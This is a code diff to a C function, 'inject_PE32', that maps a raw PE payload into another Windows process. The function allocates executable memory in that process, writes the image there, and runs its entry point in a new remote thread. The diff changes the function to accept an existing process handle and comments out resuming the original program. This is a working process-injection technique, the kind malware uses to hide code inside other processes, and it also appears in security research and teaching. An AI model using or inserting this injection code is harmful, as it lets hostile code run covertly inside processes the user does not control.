@@ -83,10 +83,9 @@ inject_PE32:
     payload - buffer with raw image of PE that we want to inject
     payload_size - size of the above
 
-    erase_headers - should erase headers of the payload?
     run_original - should run the original process?
 */
-bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, bool erase_headers, bool run_original)
+bool inject_PE32(HANDLE hProcess, BYTE* payload, SIZE_T payload_size, bool erase_headers)
 {
     if (!load_ntdll_functions()) return false;
 
@@ -107,12 +106,7 @@ bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, bool era
     const LONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
     DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;
 
-    //create target process:
-    PROCESS_INFORMATION pi;
-    if (!create_new_process1(targetPath, pi)) return false;
-    printf("PID: %d\n", pi.dwProcessId);
-
-    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (remoteAddress == NULL)  {
         printf("Could not allocate memory in the remote process\n");
         return false;
@@ -156,7 +150,7 @@ bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, bool era
     }
 
     // paste the local copy of the prepared image into the reserved space inside the remote process:
-    if (!WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
+    if (!WriteProcessMemory(hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
         printf("[ERROR] Could not paste the image into remote process!\n");
         return false;
     }
@@ -165,16 +159,15 @@ bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, bool era
 
     LPVOID newEP = (LPVOID)((DWORD) remoteAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint);
     printf("newEP = %p\n", newEP);
-    run_injected_in_new_thread(pi.hProcess, newEP);
-
+    run_injected_in_new_thread(hProcess, newEP);
+    /*
     //we may also run the original program
     if (run_original) {
         ResumeThread(pi.hThread);
     }
-
+    */
     //free the handles
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    //CloseHandle(pi.hThread);
     CloseHandle(currentProcHandle);
     return true;
 }
